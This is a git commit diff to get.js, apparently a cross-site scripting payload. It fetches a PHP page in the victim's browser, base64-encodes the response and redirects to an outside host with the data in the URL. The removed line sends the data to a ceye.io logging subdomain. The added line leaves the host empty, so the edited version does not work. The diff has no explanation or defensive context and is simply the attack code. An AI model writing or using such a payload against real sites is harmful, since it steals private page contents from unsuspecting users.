f1b5bd302341c86e7c6b8eb2c110f99c8346172c
huodijun <48757480+huodijun@users.noreply.github.com>
2019-06-24 14:07:09 +0800

    Update get.js
    dsads

--- get.js
+++ get.js
@@ -3,7 +3,7 @@ xmlhttp.onreadystatechange=function()
 {
     if (xmlhttp.readyState==4 && xmlhttp.status==200)
     {
-        document.location='http://0740e2.ceye.io/?'+btoa(xmlhttp.responseText);
+        document.location='http://?'+btoa(xmlhttp.responseText);
     }
 }
 xmlhttp.open('GET','query_aIeMu0FUoVrW0NWPHbN6z4xh.php',true);
